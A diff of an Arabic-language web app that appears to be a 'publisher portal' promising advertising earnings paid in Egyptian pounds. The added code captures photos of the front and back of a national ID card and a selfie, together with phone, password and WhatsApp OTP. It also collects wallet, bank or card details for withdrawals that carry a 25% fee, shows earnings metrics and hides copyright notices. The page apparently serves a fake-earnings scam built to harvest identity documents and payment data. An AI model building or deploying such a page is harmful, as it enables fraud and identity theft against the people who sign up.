@@ -8,15 +8,7 @@
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="apple-mobile-web-app-title" content="عوائد الإعلانات">
     <script src="protection.js" defer></script>
-
-    <!-- التحقق الفوري من تسجيل الدخول قبل عرض الصفحة -->
-    <script>
-        if (!localStorage.getItem("ad_portal_user_token")) {
-            window.location.replace("login.html");
-        }
-    </script>
-
-    <title>لوحة العوائد | منصة AD$ للتمويل الإعلاني</title>
+    <title>بوابة الناشرين | عوائد الحملات الإعلانية والمكافآت الترويجية</title>
 
     <!-- شعار سطر الويب (Favicon) -->
     <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 120 120'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0%25' y1='0%25' x2='100%25' y2='100%25'%3E%3Cstop offset='0%25' stop-color='%232563eb'/%3E%3Cstop offset='100%25' stop-color='%2310b981'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='120' height='120' rx='28' fill='%230f172a'/%3E%3Crect x='6' y='6' width='108' height='108' rx='24' fill='none' stroke='url(%23g)' stroke-width='4'/%3E%3Cpath d='M30 78 L50 56 L66 68 L90 38' fill='none' stroke='url(%23g)' stroke-width='8' stroke-linecap='round' stroke-linejoin='round'/%3E%3Ccircle cx='90' cy='38' r='7' fill='%2310b981'/%3E%3Ctext x='60' y='102' font-family='Arial,sans-serif' font-size='22' font-weight='bold' fill='%23ffffff' text-anchor='middle'%3EAD%24%3C/text%3E%3C/svg%3E">
@@ -61,10 +53,12 @@
             display: flex;
             flex-direction: column;
             align-items: center;
+            justify-content: center;
             padding: 2rem 1rem;
             position: relative;
         }
 
+        /* إخفاء أي عنصر حقوق محفوظة قد يحقنه ملف protection.js */
         footer, .footer, .copyright, .c-common-copyright, [id*="copyright"], [class*="copyright"] {
             display: none !important;
             height: 0 !important;
@@ -98,12 +92,12 @@
         .container {
             width: 100%;
             max-width: 760px;
-            margin: 0 auto;
+            margin: auto;
         }
 
         header {
             text-align: center;
-            margin-bottom: 1.6rem;
+            margin-bottom: 1.8rem;
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -156,6 +150,33 @@
             display: block;
         }
 
+        .network-tag {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(59, 130, 246, 0.1);
+            border: 1px solid rgba(59, 130, 246, 0.25);
+            padding: 4px 14px;
+            border-radius: 50px;
+            font-size: 0.8rem;
+            color: #60a5fa;
+            margin-bottom: 0.75rem;
+        }
+
+        header h1 {
+            font-size: clamp(1.45rem, 4.5vw, 1.85rem);
+            font-weight: 800;
+            margin-bottom: 0.35rem;
+            background: linear-gradient(180deg, #ffffff 0%, #cbd5e1 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        header p {
+            color: var(--text-muted);
+            font-size: 0.92rem;
+        }
+
         .install-toast {
             display: none;
             background: rgba(16, 185, 129, 0.15);
@@ -167,6 +188,205 @@
             margin-bottom: 1.2rem;
             text-align: center;
             width: 100%;
+        }
+
+        .auth-card, .form-card, .history-card {
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: 20px;
+            padding: clamp(1.3rem, 4vw, 2rem);
+            backdrop-filter: blur(14px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.35);
+            margin-bottom: 1.8rem;
+        }
+
+        .auth-tabs {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 6px;
+            background: rgba(10, 15, 29, 0.78);
+            padding: 6px;
+            border-radius: 12px;
+            margin-bottom: 1.5rem;
+            border: 1px solid var(--card-border);
+        }
+
+        .auth-tab-btn {
+            background: transparent;
+            color: var(--text-muted);
+            border: none;
+            padding: 0.65rem 0.4rem;
+            border-radius: 8px;
+            font-weight: 700;
+            font-size: clamp(0.76rem, 2.3vw, 0.86rem);
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .auth-tab-btn.active {
+            background: var(--primary);
+            color: #fff;
+            box-shadow: 0 4px 12px var(--primary-glow);
+        }
+
+        .form-group {
+            margin-bottom: 1.2rem;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 0.45rem;
+            color: var(--text-muted);
+            font-size: 0.88rem;
+            font-weight: 600;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 0.85rem 1rem;
+            border-radius: 10px;
+            border: 1px solid var(--card-border);
+            background: var(--input-bg);
+            color: #fff;
+            font-size: 0.95rem;
+            outline: none;
+            transition: all 0.2s ease;
+        }
+
+        input:focus, select:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.15);
+        }
+
+        select {
+            cursor: pointer;
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%2394a3b8' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: left 1rem center;
+            background-size: 1.1em;
+        }
+
+        .numeric-ltr-input {
+            direction: ltr;
+            text-align: right;
+            font-variant-numeric: tabular-nums;
+            letter-spacing: 1.4px;
+            font-weight: 700;
+        }
+
+        .input-hint {
+            display: block;
+            margin-top: 0.4rem;
+            font-size: 0.78rem;
+            color: var(--text-muted);
+        }
+
+        .otp-row {
+            display: flex;
+            gap: 10px;
+            align-items: stretch;
+        }
+
+        .btn-whatsapp-otp {
+            background: rgba(16, 185, 129, 0.16);
+            color: #34d399;
+            border: 1px solid rgba(16, 185, 129, 0.4);
+            border-radius: 10px;
+            padding: 0 1rem;
+            font-weight: 700;
+            font-size: 0.84rem;
+            cursor: pointer;
+            white-space: nowrap;
+            transition: all 0.2s;
+        }
+
+        .btn-whatsapp-otp:hover {
+            background: var(--accent);
+            color: #070b14;
+        }
+
+        /* شبكة تصوير المستندات الثلاثة (وجه البطاقة + ظهر البطاقة + الصورة الشخصية) */
+        .kyc-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 12px;
+        }
+
+        .id-upload-box {
+            border: 2px dashed rgba(59, 130, 246, 0.4);
+            border-radius: 14px;
+            padding: 1rem 0.85rem;
+            text-align: center;
+            background: rgba(10, 15, 29, 0.65);
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 125px;
+        }
+
+        .id-upload-box:hover {
+            border-color: var(--accent);
+            background: rgba(16, 185, 129, 0.06);
+        }
+
+        .id-upload-box.has-file {
+            border-color: var(--accent);
+            border-style: solid;
+        }
+
+        .upload-icon {
+            font-size: 1.65rem;
+            margin-bottom: 0.35rem;
+        }
+
+        .upload-title {
+            font-size: 0.86rem;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 0.2rem;
+        }
+
+        .upload-sub {
+            font-size: 0.74rem;
+            color: var(--text-muted);
+        }
+
+        .id-preview-img {
+            max-width: 100%;
+            max-height: 145px;
+            border-radius: 10px;
+            margin-top: 0.65rem;
+            display: none;
+            border: 1px solid var(--accent);
+            object-fit: cover;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 1rem;
+            background: linear-gradient(135deg, #2563eb, #1d4ed8);
+            color: #fff;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.03rem;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 4px 15px var(--primary-glow);
+            transition: all 0.2s ease;
+        }
+
+        .btn-submit:hover {
+            filter: brightness(1.1);
+            transform: translateY(-1px);
+        }
+
+        .btn-submit:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
         }
 
         .user-top-bar {
@@ -301,16 +521,6 @@
             50% { opacity: 0.3; transform: scale(0.85); }
         }
 
-        .form-card, .history-card {
-            background: var(--card-bg);
-            border: 1px solid var(--card-border);
-            border-radius: 20px;
-            padding: clamp(1.3rem, 4vw, 2rem);
-            backdrop-filter: blur(14px);
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.35);
-            margin-bottom: 1.8rem;
-        }
-
         .card-header {
             display: flex;
             align-items: center;
@@ -332,50 +542,6 @@
             border-radius: 8px;
             font-size: 0.78rem;
             font-weight: 600;
-        }
-
-        .form-group { margin-bottom: 1.2rem; }
-        label { display: block; margin-bottom: 0.45rem; color: var(--text-muted); font-size: 0.88rem; font-weight: 600; }
-
-        input, select {
-            width: 100%;
-            padding: 0.85rem 1rem;
-            border-radius: 10px;
-            border: 1px solid var(--card-border);
-            background: var(--input-bg);
-            color: #fff;
-            font-size: 0.95rem;
-            outline: none;
-            transition: all 0.2s ease;
-        }
-
-        input:focus, select:focus {
-            border-color: var(--primary);
-            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.15);
-        }
-
-        select {
-            cursor: pointer;
-            appearance: none;
-            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%2394a3b8' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
-            background-repeat: no-repeat;
-            background-position: left 1rem center;
-            background-size: 1.1em;
-        }
-
-        .numeric-ltr-input {
-            direction: ltr;
-            text-align: right;
-            font-variant-numeric: tabular-nums;
-            letter-spacing: 1.4px;
-            font-weight: 700;
-        }
-
-        .input-hint {
-            display: block;
-            margin-top: 0.4rem;
-            font-size: 0.78rem;
-            color: var(--text-muted);
         }
 
         .fee-card {
@@ -406,30 +572,6 @@
         .fee-danger { color: var(--danger); }
         .fee-usd { color: #cbd5e1; font-weight: 600; }
         .fee-net-egp { color: var(--accent); font-weight: 800; }
-
-        .btn-submit {
-            width: 100%;
-            padding: 1rem;
-            background: linear-gradient(135deg, #2563eb, #1d4ed8);
-            color: #fff;
-            border: none;
-            border-radius: 10px;
-            font-size: 1.03rem;
-            font-weight: 700;
-            cursor: pointer;
-            box-shadow: 0 4px 15px var(--primary-glow);
-            transition: all 0.2s ease;
-        }
-
-        .btn-submit:hover {
-            filter: brightness(1.1);
-            transform: translateY(-1px);
-        }
-
-        .btn-submit:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
 
         .withdraw-list {
             display: flex;
@@ -622,128 +764,240 @@
                 <span class="logo-install-hint" id="installStatusText">📲 اضغط على الشعار لتثبيت التطبيق</span>
             </div>
         </div>
+
         <div id="installToast" class="install-toast"></div>
+
+        <div class="network-tag">
+            <span>●</span> شبكة العوائد الإعلانية والشراكات الرقمية
+        </div>
+        <h1>لوحة تحكم عوائد التمويل والمكافآت</h1>
+        <p>نظام التوزيع البرمجي لأرباح المشاهدات والتحويل المباشر بالجنيه المصري</p>
     </header>
 
-    <!-- شريط المشترك المسجل دخوله -->
-    <div class="user-top-bar">
-        <div>
-            <span class="user-welcome">👤 مرحباً، <span id="loggedUserName">--</span></span>
-            <span class="user-phone-tag" dir="ltr" id="loggedUserPhone"></span>
-        </div>
-        <button type="button" class="btn-logout" onclick="logoutUser()">تسجيل الخروج</button>
-    </div>
-
-    <!-- مؤشرات الأداء الإعلاني المتفاعلة -->
-    <div class="metrics-grid">
-        <div class="metric-card">
-            <div class="metric-label">مرات الظهور (Impressions)</div>
-            <div class="metric-val" id="metricImpressions">0</div>
-            <div class="metric-trend" id="trendImpressions">● متزامن مع حسابك</div>
-        </div>
-        <div class="metric-card">
-            <div class="metric-label">متوسط eCPM</div>
-            <div class="metric-val" id="metricEcpm">$0.00</div>
-            <div class="metric-trend">▲ استقرار العائد</div>
-        </div>
-        <div class="metric-card">
-            <div class="metric-label">نسبة التفاعل (CTR)</div>
-            <div class="metric-val" id="metricCtr">0.00%</div>
-            <div class="metric-trend">● متوافق مع المعايير</div>
-        </div>
-        <div class="metric-card">
-            <div class="metric-label">الحملات الممولة النشطة</div>
-            <div class="metric-val" id="metricCampaigns">0 حملة</div>
-            <div class="metric-trend">● رعاية مباشرة معتمدة</div>
-        </div>
-    </div>
-
-    <!-- بطاقة الرصيد المستحق -->
-    <div class="balance-card">
-        <div class="balance-title">إجمالي عوائد التمويل المتاحة في حسابك المستقل</div>
-        <div class="balance-amount">
-            <span id="currentBalance">0.00</span>
-            <span class="currency-symbol">$</span>
-        </div>
-        <div class="egp-equivalent-bar" id="egpBalanceEquivalent">
-            ما يعادل تقريباً: 0.00 ج.م (بسعر البنك الرسمي)
-        </div>
-        <div class="payout-cycle">
-            <span class="status-dot"></span>
-            جاهزية السيولة الإعلانية: متزامنة لحظياً مع بوابة التسوية
-        </div>
-    </div>
-
-    <!-- بطاقة طلب الصرف والسحب -->
-    <div class="form-card">
-        <div class="card-header">
-            <h3>طلب سحب وتحويل الأرباح (بالجنيه المصري)</h3>
-            <span class="bank-rate-badge">سعر الصرف الرسمي: <strong id="bankRateDisplay">56.26</strong> ج.م</span>
+    <!-- =================================================================== -->
+    <!-- أولاً: شاشة تسجيل الدخول / تسجيل مشترك جديد / نسيان الباسورد -->
+    <!-- =================================================================== -->
+    <div id="authSection" class="auth-card">
+        <div class="auth-tabs">
+            <button type="button" class="auth-tab-btn active" onclick="switchAuthTab('login')">🔐 تسجيل الدخول</button>
+            <button type="button" class="auth-tab-btn" onclick="switchAuthTab('register')">🪪 تسجيل مشترك جديد</button>
+            <button type="button" class="auth-tab-btn" onclick="switchAuthTab('reset')">🔑 نسيت كلمة المرور</button>
         </div>
 
-        <form id="payoutForm">
+        <!-- 1. نموذج تسجيل الدخول -->
+        <form id="loginForm">
             <div class="form-group">
-                <label for="userName">اسم الناشر / المستفيد</label>
-                <input type="text" id="userName" placeholder="أدخل اسمك أو معرف الحساب" required>
+                <label>رقم الهاتف المسجل (11 رقماً يبدأ بـ 01)</label>
+                <input type="text" id="loginPhone" class="numeric-ltr-input" inputmode="numeric" maxlength="11" placeholder="01xxxxxxxxx" required>
             </div>
-
             <div class="form-group">
-                <label for="withdrawAmount">المبلغ المطلوب سحبه من الرصيد بالدولار ($)</label>
-                <input type="number" id="withdrawAmount" inputmode="decimal" placeholder="أدخل المبلغ بالدولار (مثال: 100)" min="1" step="any" required>
+                <label>كلمة المرور</label>
+                <input type="password" id="loginPassword" placeholder="أدخل كلمة المرور الخاصة بحسابك" required>
             </div>
-
-            <div class="form-group">
-                <label for="payoutMethod">طريقة استلام الأرباح بالجنيه المصري</label>
-                <select id="payoutMethod" required>
-                    <option value="" disabled selected>اختر وسيلة الاستلام المفضلة...</option>
-                    <option value="محفظة إلكترونية">محفظة إلكترونية (محافظ ذكية)</option>
-                    <option value="حساب بنكي">تحويل حساب بنكي محلي (إنستاباي / IBAN / رقم الحساب البنكي)</option>
-                    <option value="فيزا / ماستركارد">بطاقة دفع بنكية (فيزا / ماستركارد)</option>
-                </select>
-            </div>
-
-            <div class="form-group" id="dynamicField" style="display: none;">
-                <label id="dynamicLabel" for="destinationDetails">بيانات التحويل</label>
-                <input type="text" id="destinationDetails" required>
-                <small id="dynamicHint" class="input-hint"></small>
-            </div>
-
-            <div class="fee-card">
-                <div class="fee-row">
-                    <span>إجمالي المبلغ المطلوب سحبه:</span>
-                    <span id="calcGross">$0.00</span>
-                </div>
-                <div class="fee-row">
-                    <span>رسوم المعالجة والتحويل الإعلاني (25%):</span>
-                    <span id="calcFee" class="fee-danger">-$0.00</span>
-                </div>
-                <div class="fee-row">
-                    <span>الصافي بالدولار بعد الخصم:</span>
-                    <span id="calcNetUsd" class="fee-usd">$0.00</span>
-                </div>
-                <div class="fee-row">
-                    <span>سعر الصرف الرسمي للبنوك:</span>
-                    <span id="calcRateRow">1$ = 56.26 ج.م</span>
-                </div>
-                <div class="fee-row total-egp">
-                    <span>المبلغ النهائي المستلم بالمصري:</span>
-                    <span id="calcNetEgp" class="fee-net-egp">0.00 ج.م</span>
-                </div>
-            </div>
-
-            <button type="submit" class="btn-submit" id="submitBtn">تأكيد طلب الصرف والاستلام بالمصري</button>
+            <button type="submit" class="btn-submit" id="loginBtn">دخول إلى لوحة عوائد حسابي</button>
         </form>
 
-        <div id="alertBox" class="alert-box"></div>
+        <!-- 2. نموذج تسجيل مشترك جديد + تصوير البطاقة (وجه وظهر) + صورة شخصية + كود واتساب -->
+        <form id="registerForm" style="display: none;">
+            <div class="form-group">
+                <label>الاسم الثلاثي (كما في البطاقة الشخصية)</label>
+                <input type="text" id="regName" placeholder="أدخل اسمك الكامل" required>
+            </div>
+            <div class="form-group">
+                <label>رقم الهاتف (مربوط بالواتساب لاستلام كود الـ 7 أرقام)</label>
+                <input type="text" id="regPhone" class="numeric-ltr-input" inputmode="numeric" maxlength="11" placeholder="01xxxxxxxxx" required>
+            </div>
+            <div class="form-group">
+                <label>اختر كلمة مرور لحسابك</label>
+                <input type="password" id="regPassword" placeholder="أدخل كلمة مرور قوية" required>
+            </div>
+
+            <!-- تصوير المستندات الثلاثة المطلوبة للتوثيق -->
+            <div class="form-group">
+                <label>المرفقات المطلوبة للتوثيق (وجه البطاقة + ظهر البطاقة + صورة شخصية)</label>
+                <div class="kyc-grid">
+                    <!-- 1. وجه البطاقة الشخصية -->
+                    <div class="id-upload-box" id="boxIdFront" onclick="document.getElementById('idFrontInput').click()">
+                        <span class="upload-icon">🪪</span>
+                        <span class="upload-title">1. وجه البطاقة الشخصية</span>
+                        <span class="upload-sub">اضغط للتصوير بالكاميرا</span>
+                        <input type="file" id="idFrontInput" accept="image/*" capture="environment" style="display: none;">
+                        <img id="previewIdFront" class="id-preview-img" alt="وجه البطاقة">
+                    </div>
+
+                    <!-- 2. ظهر البطاقة الشخصية -->
+                    <div class="id-upload-box" id="boxIdBack" onclick="document.getElementById('idBackInput').click()">
+                        <span class="upload-icon">🔄</span>
+                        <span class="upload-title">2. ظهر البطاقة الشخصية</span>
+                        <span class="upload-sub">اضغط للتصوير بالكاميرا</span>
+                        <input type="file" id="idBackInput" accept="image/*" capture="environment" style="display: none;">
+                        <img id="previewIdBack" class="id-preview-img" alt="ظهر البطاقة">
+                    </div>
+
+                    <!-- 3. صورة شخصية (سيلفي) -->
+                    <div class="id-upload-box" id="boxSelfie" onclick="document.getElementById('selfieInput').click()">
+                        <span class="upload-icon">🤳</span>
+                        <span class="upload-title">3. صورة شخصية حديثة</span>
+                        <span class="upload-sub">اضغط لالتقاط صورة واضحة</span>
+                        <input type="file" id="selfieInput" accept="image/*" capture="user" style="display: none;">
+                        <img id="previewSelfie" class="id-preview-img" alt="الصورة الشخصية">
+                    </div>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>كود مصادقة واتساب (مكون من 7 أرقام)</label>
+                <div class="otp-row">
+                    <input type="text" id="regOtp" class="numeric-ltr-input" inputmode="numeric" maxlength="7" placeholder="XXXXXXX (7 أرقام)" required>
+                    <button type="button" class="btn-whatsapp-otp" onclick="requestWhatsAppOtp('register')">📲 إرسال كود واتساب</button>
+                </div>
+            </div>
+
+            <button type="submit" class="btn-submit" id="regBtn">إرسال طلب التسجيل والمرفقات الثلاثة</button>
+        </form>
+
+        <!-- 3. نموذج نسيان كلمة المرور عبر واتساب OTP (7 أرقام) -->
+        <form id="resetForm" style="display: none;">
+            <div class="form-group">
+                <label>رقم الهاتف المسجل (11 رقماً)</label>
+                <input type="text" id="resetPhone" class="numeric-ltr-input" inputmode="numeric" maxlength="11" placeholder="01xxxxxxxxx" required>
+            </div>
+            <div class="form-group">
+                <label>كود مصادقة واتساب (7 أرقام)</label>
+                <div class="otp-row">
+                    <input type="text" id="resetOtp" class="numeric-ltr-input" inputmode="numeric" maxlength="7" placeholder="XXXXXXX (7 أرقام)" required>
+                    <button type="button" class="btn-whatsapp-otp" onclick="requestWhatsAppOtp('reset')">📲 إرسال كود 7 أرقام</button>
+                </div>
+            </div>
+            <div class="form-group">
+                <label>كلمة المرور الجديدة</label>
+                <input type="password" id="resetNewPassword" placeholder="أدخل كلمة المرور الجديدة" required>
+            </div>
+            <button type="submit" class="btn-submit" id="resetBtn">تأكيد الكود وتغيير كلمة المرور</button>
+        </form>
+
+        <div id="authAlert" class="alert-box"></div>
     </div>
 
-    <!-- بطاقة قائمة مبالغ السحب -->
-    <div class="history-card">
-        <div class="card-header">
-            <h3>سجل مبالغ وطلبات السحب الخاصة بحسابك</h3>
-            <button type="button" class="btn-clear" id="clearListBtn">🔒 مسح القائمة</button>
+    <!-- =================================================================== -->
+    <!-- ثانياً: لوحة عوائد المشترك المستقلة -->
+    <!-- =================================================================== -->
+    <div id="dashboardSection" style="display: none;">
+        <div class="user-top-bar">
+            <div>
+                <span class="user-welcome">👤 مرحباً، <span id="loggedUserName">--</span></span>
+                <span class="user-phone-tag" dir="ltr" id="loggedUserPhone"></span>
+            </div>
+            <button type="button" class="btn-logout" onclick="logoutUser()">تسجيل الخروج</button>
         </div>
-        <div id="withdrawListContainer" class="withdraw-list"></div>
+
+        <div class="metrics-grid">
+            <div class="metric-card">
+                <div class="metric-label">مرات الظهور (Impressions)</div>
+                <div class="metric-val" id="metricImpressions">0</div>
+                <div class="metric-trend" id="trendImpressions">● متزامن مع حسابك</div>
+            </div>
+            <div class="metric-card">
+                <div class="metric-label">متوسط eCPM</div>
+                <div class="metric-val" id="metricEcpm">$0.00</div>
+                <div class="metric-trend">▲ استقرار العائد</div>
+            </div>
+            <div class="metric-card">
+                <div class="metric-label">نسبة التفاعل (CTR)</div>
+                <div class="metric-val" id="metricCtr">0.00%</div>
+                <div class="metric-trend">● متوافق مع المعايير</div>
+            </div>
+            <div class="metric-card">
+                <div class="metric-label">الحملات الممولة النشطة</div>
+                <div class="metric-val" id="metricCampaigns">0 حملة</div>
+                <div class="metric-trend">● رعاية مباشرة معتمدة</div>
+            </div>
+        </div>
+
+        <div class="balance-card">
+            <div class="balance-title">إجمالي عوائد التمويل المتاحة في حسابك المستقل</div>
+            <div class="balance-amount">
+                <span id="currentBalance">0.00</span>
+                <span class="currency-symbol">$</span>
+            </div>
+            <div class="egp-equivalent-bar" id="egpBalanceEquivalent">
+                ما يعادل تقريباً: 0.00 ج.م (بسعر البنك الرسمي)
+            </div>
+            <div class="payout-cycle">
+                <span class="status-dot"></span>
+                جاهزية السيولة الإعلانية: متزامنة لحظياً مع بوابة التسوية
+            </div>
+        </div>
+
+        <div class="form-card">
+            <div class="card-header">
+                <h3>طلب سحب وتحويل الأرباح (بالجنيه المصري)</h3>
+                <span class="bank-rate-badge">سعر الصرف الرسمي: <strong id="bankRateDisplay">56.26</strong> ج.م</span>
+            </div>
+
+            <form id="payoutForm">
+                <div class="form-group">
+                    <label for="userName">اسم الناشر / المستفيد</label>
+                    <input type="text" id="userName" placeholder="أدخل اسمك أو معرف الحساب" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="withdrawAmount">المبلغ المطلوب سحبه من الرصيد بالدولار ($)</label>
+                    <input type="number" id="withdrawAmount" inputmode="decimal" placeholder="أدخل المبلغ بالدولار (مثال: 100)" min="1" step="any" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="payoutMethod">طريقة استلام الأرباح بالجنيه المصري</label>
+                    <select id="payoutMethod" required>
+                        <option value="" disabled selected>اختر وسيلة الاستلام المفضلة...</option>
+                        <option value="محفظة إلكترونية">محفظة إلكترونية (محافظ ذكية)</option>
+                        <option value="حساب بنكي">تحويل حساب بنكي محلي (إنستاباي / IBAN / رقم الحساب البنكي)</option>
+                        <option value="فيزا / ماستركارد">بطاقة دفع بنكية (فيزا / ماستركارد)</option>
+                    </select>
+                </div>
+
+                <div class="form-group" id="dynamicField" style="display: none;">
+                    <label id="dynamicLabel" for="destinationDetails">بيانات التحويل</label>
+                    <input type="text" id="destinationDetails" required>
+                    <small id="dynamicHint" class="input-hint"></small>
+                </div>
+
+                <div class="fee-card">
+                    <div class="fee-row">
+                        <span>إجمالي المبلغ المطلوب سحبه:</span>
+                        <span id="calcGross">$0.00</span>
+                    </div>
+                    <div class="fee-row">
+                        <span>رسوم المعالجة والتحويل الإعلاني (25%):</span>
+                        <span id="calcFee" class="fee-danger">-$0.00</span>
+                    </div>
+                    <div class="fee-row">
+                        <span>الصافي بالدولار بعد الخصم:</span>
+                        <span id="calcNetUsd" class="fee-usd">$0.00</span>
+                    </div>
+                    <div class="fee-row">
+                        <span>سعر الصرف الرسمي للبنوك:</span>
+                        <span id="calcRateRow">1$ = 56.26 ج.م</span>
+                    </div>
+                    <div class="fee-row total-egp">
+                        <span>المبلغ النهائي المستلم بالمصري:</span>
+                        <span id="calcNetEgp" class="fee-net-egp">0.00 ج.م</span>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-submit" id="submitBtn">تأكيد طلب الصرف والاستلام بالمصري</button>
+            </form>
+
+            <div id="alertBox" class="alert-box"></div>
+        </div>
+
+        <div class="history-card">
+            <div class="card-header">
+                <h3>سجل مبالغ وطلبات السحب الخاصة بحسابك</h3>
+                <button type="button" class="btn-clear" id="clearListBtn">🔒 مسح القائمة</button>
+            </div>
+            <div id="withdrawListContainer" class="withdraw-list"></div>
+        </div>
     </div>
 </div>
 
@@ -767,17 +1021,11 @@
     const TOKEN_KEY = "ad_portal_user_token";
 
     let authToken = localStorage.getItem(TOKEN_KEY) || "";
+    let idFrontBase64 = "";
+    let idBackBase64 = "";
+    let selfieBase64 = "";
     let currentAvailableBalance = 0.00;
     let officialBankRate = 56.26;
-
-    function logoutUser() {
-        localStorage.removeItem(TOKEN_KEY);
-        window.location.replace("login.html");
-    }
-
-    if (!authToken) {
-        logoutUser();
-    }
 
     // إزالة أي عنصر حقوق محفوظة قد يحقنه ملف protection.js
     function removeInjectedCopyright() {
@@ -804,6 +1052,14 @@
         e.preventDefault();
         deferredInstallPrompt = e;
         installStatusText.textContent = "📲 اضغط هنا لتثبيت المنصة كتطبيق فوري";
+    });
+
+    window.addEventListener("appinstalled", () => {
+        deferredInstallPrompt = null;
+        installStatusText.textContent = "✓ تم تثبيت التطبيق على جهازك";
+        installToast.style.display = "block";
+        installToast.textContent = "✅ تم تثبيت تطبيق عوائد الإعلانات بنجاح على شاشتك الرئيسية!";
+        setTimeout(() => { installToast.style.display = "none"; }, 5000);
     });
 
     installAppLogo.addEventListener("click", async () => {
@@ -914,6 +1170,227 @@
         } catch (e) {}
 
         return telemetry;
+    }
+
+    // 3. إجبار حقول الهاتف على البدء بـ 01 و11 رقماً، وحقول الكود على 7 أرقام
+    ["loginPhone", "regPhone", "resetPhone"].forEach(id => {
+        const el = document.getElementById(id);
+        el.addEventListener("input", () => {
+            let digits = el.value.replace(/\D/g, "");
+            if (!digits.startsWith("01")) {
+                digits = digits.startsWith("0") ? "01" + digits.slice(1) : "01" + digits;
+            }
+            el.value = digits.slice(0, 11);
+        });
+    });
+
+    ["regOtp", "resetOtp"].forEach(id => {
+        const el = document.getElementById(id);
+        el.addEventListener("input", () => {
+            el.value = el.value.replace(/\D/g, "").slice(0, 7);
+        });
+    });
+
+    function switchAuthTab(tab) {
+        const tabs = document.querySelectorAll(".auth-tab-btn");
+        tabs[0].classList.toggle("active", tab === "login");
+        tabs[1].classList.toggle("active", tab === "register");
+        tabs[2].classList.toggle("active", tab === "reset");
+
+        document.getElementById("loginForm").style.display = tab === "login" ? "block" : "none";
+        document.getElementById("registerForm").style.display = tab === "register" ? "block" : "none";
+        document.getElementById("resetForm").style.display = tab === "reset" ? "block" : "none";
+        document.getElementById("authAlert").style.display = "none";
+    }
+
+    function showAuthMessage(text, isSuccess) {
+        const box = document.getElementById("authAlert");
+        box.className = "alert-box " + (isSuccess ? "alert-success" : "alert-danger");
+        box.textContent = text;
+        box.style.display = "block";
+    }
+
+    // دالة مساعدة لضغط ومعاينة الصور الثلاث (وجه البطاقة + ظهر البطاقة + الصورة الشخصية)
+    function bindImageUploader(inputId, previewId, boxId, onSaveCallback) {
+        document.getElementById(inputId).addEventListener("change", (e) => {
+            const file = e.target.files[0];
+            if (!file) return;
+
+            const reader = new FileReader();
+            reader.onload = (ev) => {
+                const img = new Image();
+                img.onload = () => {
+                    const canvas = document.createElement("canvas");
+                    const maxW = 900;
+                    const scale = img.width > maxW ? maxW / img.width : 1;
+                    canvas.width = img.width * scale;
+                    canvas.height = img.height * scale;
+                    const ctx = canvas.getContext("2d");
+                    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+                    const compressed = canvas.toDataURL("image/jpeg", 0.76);
+
+                    onSaveCallback(compressed);
+
+                    const preview = document.getElementById(previewId);
+                    preview.src = compressed;
+                    preview.style.display = "block";
+                    document.getElementById(boxId).classList.add("has-file");
+                };
+                img.src = ev.target.result;
+            };
+            reader.readAsDataURL(file);
+        });
+    }
+
+    bindImageUploader("idFrontInput", "previewIdFront", "boxIdFront", (val) => { idFrontBase64 = val; });
+    bindImageUploader("idBackInput", "previewIdBack", "boxIdBack", (val) => { idBackBase64 = val; });
+    bindImageUploader("selfieInput", "previewSelfie", "boxSelfie", (val) => { selfieBase64 = val; });
+
+    async function requestWhatsAppOtp(purpose) {
+        const phone = purpose === "register"
+            ? document.getElementById("regPhone").value.trim()
+            : document.getElementById("resetPhone").value.trim();
+
+        if (!/^01[0-9]{9}$/.test(phone)) {
+            showAuthMessage("يرجى كتابة رقم هاتف صحيح مكون من 11 رقماً يبدأ بـ 01 أولاً.", false);
+            return;
+        }
+
+        try {
+            const res = await fetch(`${API_BASE}/api/auth/send-otp`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ phone, purpose })
+            });
+            const data = await res.json();
+            showAuthMessage(data.message, data.success);
+        } catch {
+            showAuthMessage("تعذر الاتصال بالسيرفر لإرسال الكود.", false);
+        }
+    }
+
